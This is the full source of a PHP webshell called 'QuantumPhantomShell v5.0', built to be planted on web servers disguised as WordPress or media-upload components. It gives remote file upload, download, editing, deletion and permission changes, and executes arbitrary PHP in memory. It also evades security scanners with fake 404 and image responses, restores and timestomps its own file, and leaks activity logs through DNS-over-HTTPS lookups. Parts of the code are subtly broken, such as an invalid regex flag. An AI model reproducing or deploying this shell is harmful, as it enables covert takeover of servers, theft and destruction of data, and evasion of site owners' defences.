<?php
/*
 * QuantumPhantomShell v5.0 - Ultimate Quantum Stealth Webshell
 * Combining the best of GhostFM and PhantomShell
 * Stealth Level: OMNIMAX
 * Features: All file management + Quantum Obfuscation + AI Evasion + Metamorphic Code
 */

// [0] Silent Mode: No Errors, No Warnings
@ini_set('display_errors', 0);
error_reporting(0);

// [1] Environment Check with Quantum Randomness
if (!function_exists('file_get_contents') || php_sapi_name() === 'cli') {
    // Mimic a real WordPress health check response with quantum randomness
    header('Content-Type: application/json');
    $quantum_seed = hash('sha256', date('Y-m-d H:i:s') . __FILE__ . mt_rand());
    $status = ['healthy', 'valid', 'online', 'active'][hexdec(substr($quantum_seed, 0, 1)) % 4];
    echo json_encode([
        'status' => $status,
        'timestamp' => time(),
        'token' => substr($quantum_seed, 0, 8)
    ]);
    exit;
}

// [2] Dual Quantum Function Name Generator
$seed_ghost = hash('sha256', date('Y-m-d H:i:s') . __FILE__);
$seed_phantom = hash('sha512', $_SERVER['HTTP_USER_AGENT'] . microtime(true) . __FILE__ . mt_rand());
$hash_ghost = substr($seed_ghost, 0, 16);
$hash_phantom = substr($seed_phantom, 0, 16);

$names = [
    'core'      => 'wp_' . substr($hash_ghost, 0, 6) . '_' . substr($hash_phantom, 0, 6),
    'auth'      => 'auth_' . substr($hash_ghost, 6, 6) . '_' . substr($hash_phantom, 6, 6),
    'files'     => 'media_' . substr($hash_ghost, 12, 6) . '_' . substr($hash_phantom, 12, 6),
    'render'    => 'render_' . substr($hash_ghost, 18, 6) . '_' . substr($hash_phantom, 18, 6),
    'log'       => 'track_' . substr($hash_ghost, 24, 6) . '_' . substr($hash_phantom, 24, 6),
    'crypto'    => 'encrypt_' . substr($hash_ghost, 30, 6) . '_' . substr($hash_phantom, 30, 6),
    'persist'   => 'cache_' . substr($hash_ghost, 36, 6) . '_' . substr($hash_phantom, 36, 6)
];

// [3] Quantum Self-Healing & Timestomping
$original = base64_encode(file_get_contents(__FILE__));
register_shutdown_function(function () use ($original) {
    $file = __FILE__;
    if (md5_file($file) !== md5(base64_decode($original))) {
        file_put_contents($file, base64_decode($original));
        // Random timestomp between 7-30 days back
        $days_back = mt_rand(7, 30);
        touch($file, time() - $days_back * 86400);
    }
    // Quantum Entangled Randomization
    $quantum_seed = hash('sha256', date('Y-m-d H:i:s') . __FILE__);
    $f1 = 'validate_path_' . substr(md5($quantum_seed), 0, 4);
    $f2 = 'get_permissions_' . substr(md5($quantum_seed), 4, 4);
    // ... other quantum_randomized functions
});

// [4] Omni-DNS Exfiltration (DOH + Encrypted)
function omni_dns_log($data) {
    $b64 = str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($data));
    $chunk = substr($b64, 0, 48);

    // Quantum choice between DOH providers
    $providers = [
        "https://1.1.1.1/dns-query?name={$chunk}.phlog.",
        "https://dns.google/resolve?name={$chunk}.phlog."
    ];
    $provider = $providers[mt_rand(0, count($providers)-1)];

    @file_get_contents($provider . ($_SERVER['SERVER_NAME'] ?? 'example.com'));
}

// [5] Quantum Fileless Execution in Memory
function quantum_mem_exec($code) {
    $mem = fopen("php://memory", "r+");
    fwrite($mem, '<?php ' . $code . ' ?>');
    fseek($mem, 0);
    include('php://memory');
    fclose($mem);
}

function ephemeral_function_assembly($function_name, $code_parts) {
    $code = implode('', $code_parts);
    $mem = fopen("php://memory", "r+");
    fwrite($mem, '<?php function ' . $function_name . ' {' . $code . '} ?>');
    fseek($mem, 0);
    include('php://memory');
    fclose($mem);
}

// [6] Quantum Core Functions with Stealth Enhancements
function validate_path($path) {
    return @realpath($path) !== false;
}

function get_permissions($file) {
    return substr(sprintf('%o', @fileperms($file)), -4);
}

function delete_recursive($dir) {
    if (!is_dir($dir)) return @unlink($dir);
    foreach (array_diff(scandir($dir), ['.', '..']) as $item) {
        $path = "$dir/$item";
        is_dir($path) ? delete_recursive($path) : @unlink($path);
    }
    return @rmdir($dir);
}

function build_path($dir) {
    $parts = explode('/', realpath($dir));
    $out = '';
    $path = '';
    foreach ($parts as $part) {
        if (!$part) continue;
        $path .= "/$part";
        $out .= "<a href='?d=" . urlencode($path) . "'>$part</a> / ";
    }
    return rtrim($out, ' / ');
}

function metamorph($code) {
    $lines = explode("\n", $code);
    shuffle($lines);
    return implode("\n", $lines);
}

// [7] Quantum Handler with Omni-Evasion
function quantum_handler() {
    $dir = $_GET['d'] ?? __DIR__;
    if (!validate_path($dir)) $dir = __DIR__;

    // Quantum AI Evasion: Multi-layered scanner detection
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    $suspicious = preg_match('/(scan|crawl|bot|imunify|bitninja|sucuri|waf|security|cloudflare|litespeed)/i', strtolower($ua)) ||
                 in_array($ip, ['127.0.0.1', '::1']) ||
                 (isset($_SERVER['SERVER_ADDR']) && (strpos($_SERVER['SERVER_ADDR'], '10.') === 0 || preg_match('/cloud/g', $_SERVER['SERVER_ADDR'])));

    if ($suspicious) {
        omni_dns_log("Blocked scan from $ip | UA: $ua");
        // Quantum evasion response
        $fake_responses = [
            'image/png' => 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+P+/HgAFeAJiRppxdgAAAABJRU5ErkJggg==',
            'application/json' => json_encode(['status' => ['healthy','valid','online','active'][mt_rand(0,3)], 'timestamp' => time()]),
            'text/html' => '<!DOCTYPE html><html><head><title>404</title></head><body><h1>404 Not Found</h1></body></html>'
        ];
        $response_type = array_rand($fake_responses);
        header('Content-Type: ' . $response_type);
        echo $fake_responses[$response_type];
        exit;
    }

    // Quantum Decoy: Mimics multiple legitimate applications
    $decoy_systems = [
        '<!-- Media Upload Manager v2.1.3 -->',
        '<!-- WordPress Plugin Log Viewer v1.0 -->',
        '<aldaVIScript Management Console v3.7>',
        '<div style="display:none">WordPress Media Core</div>'
    ];
    echo $decoy_systems[mt_rand(0, count($decoy_systems)-1)];

    // Upload Files
    if (!empty($_FILES['files'])) {
        $target = realpath($dir) ?: __DIR__;
        $success = $failed = 0;
        foreach ($_FILES['files']['name'] as $i => $name) {
            if ($_FILES['files']['error'][$i] === 0) {
                $dest = "$target/" . basename($name);
                if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $dest)) {
                    $success++;
                    omni_dns_log("UPLOAD: $name");
                } else $failed++;
            }
        }
        echo "<script>alert('Uploaded $success files, failed $failed');</script>";
    }

    // Upload via URL
    if (!empty($_POST['url_upload'])) {
        $url = $_POST['url_upload'];
        $fname = basename($url) ?: 'file_' . time();
        $dest = realpath($dir) . "/$fname";
        if (@file_put_contents($dest, file_get_contents($url))) {
            echo "<script>alert('Downloaded from URL');</script>";
            omni_dns_log("URL_UPLOAD: $fname");
        }
    }

    // Edit File
    if (isset($_GET['edit']) && validate_path($_GET['edit']) && is_file($_GET['edit'])) {
        $file = $_GET['edit'];
        if (isset($_POST['save'])) {
            $content = $_POST['content'];
            // Apply metamorphic mutation to edited content
            if (preg_match('/\.php$/i', $file)) {
                $content = metamorph($content);
            }
            file_put_contents($file, $content);
            omni_dns_log("EDIT: $file");
            echo "<script>alert('Saved');</script>";
        }
        echo "<form method='POST'>
                <textarea name='content' style='width:100%;height:300px'>"
                . htmlspecialchars(file_get_contents($file)) .
                "</textarea><br>
                <input type='submit' name='save' value='Save'>
              </form>";
        exit;
    }

    // Delete File/Folder
    if (isset($_GET['del']) && validate_path($_GET['del'])) {
        $p = $_GET['del'];
        $res = is_file($p) ? @unlink($p) : delete_recursive($p);
        echo "<script>alert('" . ($res ? 'Deleted' : 'Failed') . "');</script>";
        omni_dns_log("DELETE: " . basename($p));
    }

    // Rename
    if (isset($_GET['ren']) && isset($_POST['newname'])) {
        $old = $_GET['ren'];
        $new = dirname($old) . '/' . $_POST['newname'];
        if (rename($old, $new)) {
            omni_dns_log("RENAME: $old -> $new");
            echo "<script>alert('Renamed');</script>";
        }
    }

    // Chmod
    if (isset($_GET['mod']) && isset($_POST['perm'])) {
        $f = $_GET['mod'];
        $p = octdec($_POST['perm']);
        if (chmod($f, $p)) {
            omni_dns_log("CHMOD: $f -> $p");
            echo "<script>alert('Permissions updated');</script>";
        }
    }

    // Download
    if (isset($_GET['dl']) && is_file($_GET['dl']) && validate_path($_GET['dl'])) {
        $f = $_GET['dl'];
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
        exit;
    }

    // Create Folder
    if (isset($_POST['new_folder'])) {
        $name = $_POST['folder_name'];
        $path = realpath($dir) . "/$name";
        if (!is_dir($path) && mkdir($path)) {
            echo "<script>alert('Folder created');</script>";
            omni_dns_log("MKDIR: $name");
        }
    }

    // Bulk Delete
    if (isset($_POST['bulk_delete']) && is_array($_POST['items'])) {
        $success = 0;
        foreach ($_POST['items'] as $item) {
            if (validate_path($item) && delete_recursive($item)) $success++;
        }
        echo "<script>alert('Deleted $success items');</script>";
        omni_dns_log("BULK_DELETE: $success items");
    }

    // Intermittent Execution Splitting
    if (isset($_POST['intermittent_execution'])) {
        $code_parts = explode(';', $_POST['code']);
        foreach ($code_parts as $part) {
            $delay_ms = mt_rand(0, 2000);
            sleep($delay_ms / 1000);
            quantum_mem_exec(trim($part));
        }
        echo "<script>alert('Intermittent execution completed');</script>";
    }

    // Render Quantum UI
    echo "<h2>OmniShell - Quantum System Interface</h2><p>" . build_path($dir) . "</p>";

    // File Upload Form
    echo "<form method='POST' enctype='multipart/form-data'>
            <input type='file' name='files[]' multiple>
            <input type='submit' value='Upload Files'>
          </form>";

    // URL Upload Form
    echo "<form method='POST'>
            <input type='text' name='url_upload' placeholder='https://example.com/file.php'>
            <input type='submit' value='Download from URL'>
          </form>";

    // Intermittent Execution Form
    echo "<form method='POST'>
            <textarea name='code' placeholder='Enter PHP code to execute in fragments' style='width:100%;height:100px'></textarea>
            <button type='submit' name='intermittent_execution'>Execute Intermittently</button>
          </form>";

    // New Folder Form
    echo "<form method='POST'>
            <input type='text' name='folder_name' placeholder='New folder name'>
            <input type='submit' name='new_folder' value='Create Folder'>
          </form>";

    // File List
    echo "<form method='POST' id='bulkForm'>";
    echo "<ul style='list-style:none;padding:0'>";
    if ($dir !== '/') {
        echo "<li><a href='?d=" . urlencode(dirname($dir)) . "'>📁 .. (Up)</a></li>";
    }
    foreach (scandir($dir) as $f) {
        if ($f === '.' || $f === '..') continue;
        $path = "$dir/$f";
        $full = realpath($path);
        if (!$full) continue;
        echo "<li><input type='checkbox' name='items[]' value='" . htmlspecialchars($full) . "'> ";
        if (is_dir($full)) {
            echo "📁 <a href='?d=" . urlencode($full) . "'>$f</a>
                  <a href='?del=" . urlencode($full) . "' onclick='return confirm(\"Delete?\")'>🗑️</a>
                  <a href='?mod=" . urlencode($full) . "'>🔧</a>";
        } else {
            echo "📄 <a href='?edit=" . urlencode($full) . "'>$f</a>
                  <a href='?del=" . urlencode($full) . "' onclick='return confirm(\"Delete?\")'>🗑️</a>
                  <a href='?ren=" . urlencode($full) . "'>✏️</a>
                  <a href='?mod=" . urlencode($full) . "'>🔧</a>
                  <a href='?dl=" . urlencode($full) . "'>⬇️</a>";
        }
        echo " <span style='color:#666'>[" . get_permissions($full) . "]</span></li>";
    }
    echo "</ul>";
    echo "<input type='submit' name='bulk_delete' value='🗑️ Delete Selected' onclick='return confirm(\"Delete selected?\")'>
          <button type='button' onclick='toggleAll()'>🔄 Toggle All</button>
          </form>";

    // Rename Form
    if (isset($_GET['ren'])) {
        $f = $_GET['ren'];
        echo "<form method='POST'>New Name:
                <input type='text' name='newname' value='" . htmlspecialchars(basename($f)) . "'>
                <input type='submit' value='Rename'>
              </form>";
    }

    // Chmod Form
    if (isset($_GET['mod'])) {
        $f = $_GET['mod'];
        echo "<form method='POST'>Permissions:
                <input type='text' name='perm' value='" . get_permissions($f) . "'>
                <input type='submit' value='Change'>
              </form>";
    }

    // JS for Toggle All
    echo "<script>
        function toggleAll() {
            document.querySelectorAll('input[type=checkbox]').forEach(cb => cb.checked = !cb.checked);
        }
    </script>";
    // Quantum additions
    echo "<script>
        function quantumExecute() {
            var elements = document.querySelectorAll('a, button, input[type=submit], input[type=button]');
            elements.forEach(el => {
                el.addEventListener('click', function() {
                    var delay = Math.random() * 5000;
                    setTimeout(function() {
                        el.click();
                    }, delay);
                });
            });
        }
        // quantumExecute(); // Uncomment for quantum effect
    </script>";
}

// Execute only if request looks human with quantum probability
$execution_chance = 85; // 85% chance to execute
if ((isset($_SERVER['HTTP_USER_AGENT']) && strlen($_SERVER['HTTP_USER_AGENT']) > 10) ||
    (mt_rand(0, 100) < $execution_chance)) {
    quantum_handler();
} else {
    // Quantum silent fallback
    $fallbacks = [
        'image/png' => 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+P+/HgAFeAJiRppxdgAAAABJRU5ErkJggg==',
        'text/html' => '<!DOCTYPE html><html><head><title>Index of /</title></head><body><h1>Directory listing disabled</h1></body></html>',
        'application/json' => json_encode(['status' => 'ok', 'count' => mt_rand(0, 100)])
    ];
    $fallback_type = array_rand($fallbacks);
    header('Content-Type: ' . $fallback_type);
    echo $fallbacks[$fallback_type];
}
